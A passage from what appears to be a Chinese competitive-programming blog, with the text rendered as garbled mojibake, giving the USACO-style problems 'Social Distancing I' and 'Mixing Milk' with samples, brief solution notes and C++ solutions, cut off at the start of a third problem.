class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç¤¾äº¤è·ç¦»-I"><a href="#ç¤¾äº¤è·ç¦»-I" class="headerlink" title="ç¤¾äº¤è·ç¦» I"></a>ç¤¾äº¤è·ç¦» I</h2><p>ä¸€ç§æ–°å‹ç–¾ç—…ï¼ŒCOWVID-19ï¼Œå¼€å§‹åœ¨å…¨ä¸–ç•Œçš„å¥¶ç‰›ä¹‹é—´ä¼ æ’­ã€‚</p><p>Farmer John æ­£åœ¨é‡‡å–å°½å¯èƒ½å¤šçš„é¢„é˜²æªæ–½æ¥é˜²æ­¢ä»–çš„ç‰›ç¾¤è¢«æ„ŸæŸ“ã€‚</p><p>Farmer John çš„ç‰›æ£šæ˜¯ä¸€ä¸ªç‹­é•¿çš„å»ºç­‘ç‰©ï¼Œæœ‰ä¸€æ’å…± $N$ ä¸ªç‰›æ ã€‚</p><p>æœ‰äº›ç‰›æ é‡Œç›®å‰æœ‰å¥¶ç‰›ï¼Œæœ‰äº›ç›®å‰ç©ºç€ã€‚</p><p>å¾—çŸ¥â€œç¤¾äº¤è·ç¦»â€çš„é‡è¦æ€§ï¼ŒFarmer John å¸Œæœ›ä½¿å¾— $D$ å°½å¯èƒ½å¤§ï¼Œå…¶ä¸­ $D$ ä¸ºæœ€è¿‘çš„ä¸¤ä¸ªæœ‰å¥¶ç‰›çš„ç‰›æ çš„è·ç¦»ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœç‰›æ  $3$ å’Œ $8$ æ˜¯æœ€è¿‘çš„æœ‰å¥¶ç‰›çš„ç‰›æ ï¼Œé‚£ä¹ˆ $D=5$ã€‚</p><p>æœ€è¿‘ä¸¤å¤´å¥¶ç‰›æ–°æ¥åˆ° Farmer John çš„ç‰›ç¾¤ï¼Œä»–éœ€è¦å†³å®šå°†å¥¹ä»¬åˆ†é…åˆ°å“ªä¸¤ä¸ªä¹‹å‰ç©ºç€çš„ç‰›æ ã€‚</p><p>è¯·æ±‚å‡ºä»–å¦‚ä½•æ”¾ç½®è¿™ä¸¤å¤´æ–°æ¥çš„å¥¶ç‰›ï¼Œä½¿å¾— $D$ ä»ç„¶å°½å¯èƒ½å¤§ã€‚</p><p>Farmer John ä¸èƒ½ç§»åŠ¨ä»»ä½•å·²æœ‰çš„å¥¶ç‰›ï¼›ä»–åªæƒ³è¦ç»™æ–°æ¥çš„å¥¶ç‰›åˆ†é…ç‰›æ ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-2"><a href="#è¾“å…¥æ ¼å¼-2" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å« $N$ã€‚</p><p>ä¸‹ä¸€è¡ŒåŒ…å«ä¸€ä¸ªé•¿ä¸º $N$ çš„å­—ç¬¦ä¸²ï¼Œç”± $0$ å’Œ $1$ ç»„æˆï¼Œæè¿°ç‰›æ£šé‡Œçš„ç‰›æ ã€‚</p><p>$0$ è¡¨ç¤ºç©ºç€çš„ç‰›æ ï¼Œ$1$ è¡¨ç¤ºæœ‰å¥¶ç‰›çš„ç‰›æ ã€‚</p><p>å­—ç¬¦ä¸²ä¸­åŒ…å«è‡³å°‘ä¸¤ä¸ª $0$ï¼Œæ‰€ä»¥æœ‰è¶³å¤Ÿçš„ç©ºé—´å®‰ç½®ä¸¤å¤´æ–°æ¥çš„å¥¶ç‰›ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-2"><a href="#è¾“å‡ºæ ¼å¼-2" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º Farmer John ä»¥æœ€ä¼˜æ–¹æ¡ˆåœ¨åŠ å…¥ä¸¤å¤´æ–°æ¥çš„å¥¶ç‰›åå¯ä»¥è¾¾åˆ°çš„æœ€å¤§ $D$ å€¼ï¼ˆæœ€è¿‘çš„æœ‰å¥¶ç‰›çš„ç‰›æ ä¹‹é—´çš„è·ç¦»ï¼‰ã€‚</p><h4 id="æ•°æ®èŒƒå›´-2"><a href="#æ•°æ®èŒƒå›´-2" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$2 \le N \le 10^5$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-2"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">1410001001000010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-2"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-2" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-2"><a href="#æ ·ä¾‹è§£é‡Š-2" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒFarmer John å¯ä»¥ä»¥è¿™æ ·çš„æ–¹å¼åŠ å…¥å¥¶ç‰›ï¼Œä½¿å¾—ç‰›æ åˆ†é…å˜ä¸º $10x010010x0010$ï¼Œå…¶ä¸­ $x$ è¡¨ç¤ºæ–°æ¥çš„å¥¶ç‰›ã€‚</p><p>æ­¤æ—¶ $D=2$ã€‚</p><p>ä¸å¯èƒ½åœ¨åŠ å…¥å¥¶ç‰›ä¹‹åå–åˆ°æ›´å¤§çš„ $D$ å€¼ã€‚</p><h4 id="é¢˜è§£ï¼š-2"><a href="#é¢˜è§£ï¼š-2" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç”¨åˆ°äº†è´ªå¿ƒ+äºŒåˆ†ï¼Œç»å…¸ç»„åˆï¼Œå’Œæ¯æ—¥ä¸€é¢˜ï¼ˆä¸€ï¼‰çš„ç‰›çš„å­¦æœ¯åœˆå·®ä¸å¤šã€‚</p><p>é‡ç‚¹æ˜¯<strong>è¿™ä¸ªä½ç½®-ä¸Šä¸ªå¥¶ç‰›ä½ç½® &gt;= x ä¸” ä¸‹ä¸ªå¥¶ç‰›ä½ç½®-è¿™ä¸ªä½ç½® &gt;= x</strong></p><p>ä¸Šä¸ªå¥¶ç‰›ä½ç½®å¯ä»¥é¡ºåºæ‰«ææ—¶å­˜å‚¨ï¼Œè€Œä¸‹ä¸ªå¥¶ç‰›ä½ç½®å¯ä»¥é€†åºé¢„å¤„ç†nxtæ•°ç»„ã€‚</p><p>æœ€å¤§æ­£æ•´æ•°ç”¨<code>0x3f3f3f3f</code>è¡¨ç¤ºï¼Œä¸è¦å†™ä¸ª<code>1e7</code>ä¼šæœ‰é—®é¢˜</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstring&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">,</span>INF <span class="token operator">=</span> <span class="token number">0x3f3f3f3f</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>nxt<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>string s<span class="token punctuation">;</span>bool <span class="token function">check</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lst <span class="token operator">=</span> <span class="token operator">-</span>INF<span class="token punctuation">;</span><span class="token comment">//cntè®¡æ•°ï¼Œç­‰äº2å°±è¯´æ˜æ–¹æ¡ˆå¯è¡Œ,lstè¡¨ç¤ºä¸Šä¸ªç‰›æ‰€åœ¨çš„ä½ç½® </span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> i <span class="token operator">&gt;=</span> x <span class="token operator">&amp;&amp;</span> i <span class="token operator">-</span> lst <span class="token operator">&gt;=</span> x<span class="token punctuation">)</span>   <span class="token comment">//ç‰›åº”è¯¥æ”¾åœ¨0å¤„ä¸”æ”¾ç½®ä½ç½®-ä¸Šä¸ªå¥¶ç‰›ä½ç½® &gt;= xä¸”ä¸‹ä¸ªå¥¶ç‰›ä½ç½®-è¿™ä¸ªä½ç½® &gt;= x</span><span class="token punctuation">{</span>cnt<span class="token operator">++</span><span class="token punctuation">;</span>lst <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> lst <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>cnt <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">memset</span><span class="token punctuation">(</span>nxt<span class="token punctuation">,</span> INF<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>nxt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>s<span class="token punctuation">;</span><span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1e6</span><span class="token punctuation">;</span><span class="token keyword">int</span> d <span class="token operator">=</span> n<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> d <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span>i <span class="token operator">-</span> temp<span class="token punctuation">)</span><span class="token punctuation">,</span> temp <span class="token operator">=</span> i<span class="token punctuation">;</span>     <span class="token comment">//æ‰¾åˆ°æœ€å¤§çš„Då€¼ï¼Œç­”æ¡ˆä¼šå°äºç­‰äºè¿™ä¸ªdå€¼</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span>i <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span> nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nxt<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> r <span class="token operator">=</span> d<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>l <span class="token operator">&lt;</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> mid <span class="token operator">=</span> l <span class="token operator">+</span> r <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span> l <span class="token operator">=</span> mid<span class="token punctuation">;</span><span class="token keyword">else</span> r <span class="token operator">=</span> mid <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span>l<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ··åˆç‰›å¥¶"><a href="#æ··åˆç‰›å¥¶" class="headerlink" title="æ··åˆç‰›å¥¶"></a>æ··åˆç‰›å¥¶</h2><p>å†œä¸šï¼Œå°¤å…¶æ˜¯ç”Ÿäº§ç‰›å¥¶ï¼Œæ˜¯ä¸€ä¸ªç«äº‰æ¿€çƒˆçš„è¡Œä¸šã€‚</p><p>Farmer John å‘ç°å¦‚æœä»–ä¸åœ¨ç‰›å¥¶ç”Ÿäº§å·¥è‰ºä¸Šæœ‰æ‰€åˆ›æ–°ï¼Œä»–çš„ä¹³åˆ¶å“ç”Ÿæ„å¯èƒ½å°±ä¼šå—åˆ°é‡åˆ›ï¼</p><p>å¹¸è¿çš„æ˜¯ï¼ŒFarmer John æƒ³å‡ºäº†ä¸€ä¸ªå¥½ä¸»æ„ã€‚</p><p>ä»–çš„ä¸‰å¤´è·å¥–çš„ä¹³ç‰›ï¼ŒBessieã€Elsie å’Œ Mildredï¼Œå„è‡ªäº§å¥¶çš„å£å‘³æœ‰äº›è®¸ä¸åŒï¼Œä»–æ‰“ç®—æ··åˆè¿™ä¸‰ç§ç‰›å¥¶è°ƒåˆ¶å‡ºå®Œç¾çš„å£å‘³ã€‚</p><p>ä¸ºäº†æ··åˆè¿™ä¸‰ç§ä¸åŒçš„ç‰›å¥¶ï¼Œä»–æ‹¿æ¥ä¸‰ä¸ªæ¡¶ï¼Œå…¶ä¸­åˆ†åˆ«è£…æœ‰ä¸‰å¤´å¥¶ç‰›æ‰€äº§çš„å¥¶ã€‚</p><p>è¿™äº›æ¡¶å¯èƒ½æœ‰ä¸åŒçš„å®¹ç§¯ï¼Œä¹Ÿå¯èƒ½å¹¶æ²¡æœ‰å®Œå…¨è£…æ»¡ã€‚</p><p>ç„¶åä»–å°†æ¡¶ $1$ çš„ç‰›å¥¶å€’å…¥æ¡¶ $2$ï¼Œç„¶åå°†æ¡¶ $2$ ä¸­çš„ç‰›å¥¶å€’å…¥æ¡¶ $3$ï¼Œç„¶åå°†æ¡¶ $3$ ä¸­çš„ç‰›å¥¶å€’å…¥æ¡¶ $1$ï¼Œç„¶åå†å°†æ¡¶ $1$ çš„ç‰›å¥¶å€’å…¥æ¡¶ $2$ï¼Œå¦‚æ­¤å‘¨æœŸæ€§åœ°æ“ä½œï¼Œå…±è®¡è¿›è¡Œ $100$ æ¬¡ï¼ˆæ‰€ä»¥ç¬¬ $100$ æ¬¡æ“ä½œä¼šæ˜¯æ¡¶ $1$ å€’å…¥æ¡¶ $2$ï¼‰ã€‚</p><p>å½“ Farmer John å°†æ¡¶ $a$ ä¸­çš„ç‰›å¥¶å€’å…¥æ¡¶ $b$ æ—¶ï¼Œä»–ä¼šå€’å‡ºå°½å¯èƒ½å¤šçš„ç‰›å¥¶ï¼Œç›´åˆ°æ¡¶ $a$ è¢«å€’ç©ºæˆ–æ˜¯æ¡¶ $b$ è¢«å€’æ»¡ã€‚</p><p>è¯·å‘Šè¯‰ Farmer John å½“ä»–å€’äº† $100$ æ¬¡ä¹‹åæ¯ä¸ªæ¡¶é‡Œå°†ä¼šæœ‰å¤šå°‘ç‰›å¥¶ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-3"><a href="#è¾“å…¥æ ¼å¼-3" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥æ–‡ä»¶çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªç©ºæ ¼åˆ†éš”çš„æ•´æ•°ï¼šç¬¬ä¸€ä¸ªæ¡¶çš„å®¹ç§¯ $c_1$ï¼Œä»¥åŠç¬¬ä¸€ä¸ªæ¡¶é‡Œçš„ç‰›å¥¶é‡ $m_1$ã€‚</p><p>ç¬¬äºŒå’Œç¬¬ä¸‰è¡Œç±»ä¼¼åœ°åŒ…å«ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªæ¡¶çš„å®¹ç§¯å’Œç‰›å¥¶é‡ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-3"><a href="#è¾“å‡ºæ ¼å¼-3" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸‰è¡Œï¼Œç»™å‡ºå€’äº† $100$ æ¬¡ä¹‹åæ¯ä¸ªæ¡¶é‡Œçš„ç‰›å¥¶é‡ã€‚</p><h4 id="æ•°æ®èŒƒå›´-3"><a href="#æ•°æ®èŒƒå›´-3" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1 \le c_1,m_1 \le 10^9$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-3"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">10 311 412 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-3"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">0102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-3"><a href="#æ ·ä¾‹è§£é‡Š-3" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ¯å€’ä¸€æ¬¡ä¹‹åæ¯ä¸ªæ¡¶é‡Œçš„ç‰›å¥¶é‡å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">åˆå§‹çŠ¶æ€ï¼š   3  4  51. æ¡¶1-&gt;2ï¼š  0  7  52. æ¡¶2-&gt;3ï¼š  0  0  123. æ¡¶3-&gt;1ï¼š  10 0  24. æ¡¶1-&gt;2ï¼š  0  10 25. æ¡¶2-&gt;3ï¼š  0  0  12ï¼ˆä¹‹åæœ€åä¸‰ä¸ªçŠ¶æ€å¾ªç¯å‡ºç°â€¦â€¦ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-3"><a href="#é¢˜è§£ï¼š-3" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>ç®€å•æ¨¡æ‹Ÿï¼Œä¸‰æ¬¡æ“ä½œå†™åœ¨ä¸€èµ·æˆä¸€æ¬¡å¾ªç¯ã€‚</p><p>æ¯æ¬¡å¯¹å…¶ä¸­ä¸€ä¸ªæ¡¶çš„å½“å‰ç‰›å¥¶é‡å’Œå¦ä¸€ä¸ªæ¡¶çš„å‰©ä½™å®¹é‡æ¯”è¾ƒå¤§å°ã€‚</p><p><code>c[]</code>ä¸ºæ¡¶å®¹é‡ï¼Œ<code>w[]</code>ä¸ºå½“å‰æ¡¶ä¸­æœ‰å¤šå°‘ç‰›å¥¶ã€‚</p><p>$a$æ¡¶å€’å…¥$b$æ¡¶æ—¶ï¼Œ$a$æ¡¶å¢åŠ ï¼Œ$b$æ¡¶å‡å°‘ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">minv <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> w<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   when i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span>minv <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   when i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cmath&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> a<span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> a<span class="token punctuation">;</span>time <span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> w<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> a<span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+=</span> a<span class="token punctuation">;</span>time <span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>w<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> w<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-=</span> a<span class="token punctuation">;</span>w<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+=</span> a<span class="token punctuation">;</span>time <span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>time<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>cout<span class="token operator">&lt;&lt;</span>w<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>w<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span>w<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æœå£³æ¸¸æˆ"><a href="#æœå£³æ¸¸æˆ" class="headerlink" title="æœå£³æ¸¸æˆ"></a>æœå£³æ¸¸æˆ</h2><p>ä¸ºäº†æ¶ˆç£¨æ—¶å…‰ï¼Œå¥¶ç‰› Bessie å’Œå¥¹çš„æœ‹å‹ Elsie å–œæ¬¢ç©ä¸€ç§å¥¹ä»¬åœ¨å†œä¸šå±•è§ˆä¼šä¸Šçœ‹åˆ°çš„æ¸¸æˆã€‚</p><p>æ¸¸æˆå‡†å¤‡é˜¶æ®µï¼ŒBessie 